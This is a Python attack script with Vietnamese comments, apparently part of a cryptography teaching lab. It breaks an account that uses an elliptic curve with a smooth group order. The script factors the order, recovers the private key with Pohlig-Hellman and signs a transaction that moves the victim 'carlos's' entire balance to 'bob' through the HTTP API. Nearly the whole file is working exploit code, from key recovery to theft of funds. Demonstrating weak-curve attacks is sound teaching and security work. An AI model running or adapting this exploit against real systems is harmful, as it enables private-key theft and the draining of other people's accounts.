"""TẤN CÔNG 3 — ĐƯỜNG CONG YẾU / Pohlig-Hellman (qua HTTP, API công khai thật).

Tài khoản 'carlos' dùng đường cong trông y như thật (dạng y²=x³+b như secp256k1,
p và n đều ~256 bit) nhưng bậc nhóm n là số TRƠN. Phân tích thừa số n → Pohlig-
Hellman khôi phục KHÓA RIÊNG → ký giao dịch rút sạch carlos về 'bob'.

    python attack_weakcurve.py     (mất ~10-15s do chạy Pohlig-Hellman)
"""
import time

from common import (get, post, curve_from_info, factorize,
                    pohlig_hellman_dlog, sign_transfer, money)

ATTACKER = "bob"
VICTIM = "carlos"


def main():
    print("=== Tấn công 3: ĐƯỜNG CONG YẾU (Pohlig-Hellman) ===")

    _, accounts = get("/api/accounts")
    mc = next((a for a in accounts if a["user"] == VICTIM), None)
    if not mc:
        print(f"Không thấy tài khoản '{VICTIM}'.")
        return
    curve = curve_from_info(mc["curve"])
    Q = curve.point(int(mc["pub"]["x"]), int(mc["pub"]["y"]))
    print(f"Đường cong của '{VICTIM}': F_p ~{curve.p.bit_length()} bit, "
          f"bậc n ~{curve.n.bit_length()} bit (trông như đường cong thật).")

    factors = factorize(curve.n)
    q = max(factors)
    print(f"Phân tích n: {len(factors)} thừa số nguyên tố, lớn nhất ~2^{q.bit_length() - 1} "
          f"→ n TRƠN nên ECDLP phá được.")

    print("Đang giải Pohlig-Hellman (~10-15s)...")
    t0 = time.time()
    d, _ = pohlig_hellman_dlog(curve, curve.G, Q, curve.n, factors)
    dt = time.time() - t0
    if curve.mul(d, curve.G) != Q:
        print("Khôi phục khóa THẤT BẠI.")
        return
    print(f"Khôi phục khóa riêng thành công ({dt:.1f}s).")

    _, state = get("/api/state")
    amount = next(a["balance"] for a in state["accounts"] if a["user"] == VICTIM)
    # Bậc n hợp số → một số thông điệp không ký được; đổi tx id tới khi ký được.
    nid = state["next_id"]
    tx = r = s = None
    for i in range(256):
        try:
            tx, r, s = sign_transfer(curve, d, VICTIM, ATTACKER, amount, nid + i)
            break
        except ValueError:
            continue
    if tx is None:
        print("Không ký được giao dịch.")
        return
    _, res = post("/api/tx/submit", {**tx, "r": str(r), "s": str(s)})
    if isinstance(res, dict) and res.get("ok"):
        print(f"Rút {money(amount)} CBC từ '{VICTIM}' về '{ATTACKER}'.")
    else:
        print(f"Thất bại: {res.get('message') if isinstance(res, dict) else res}")


if __name__ == "__main__":
    main()
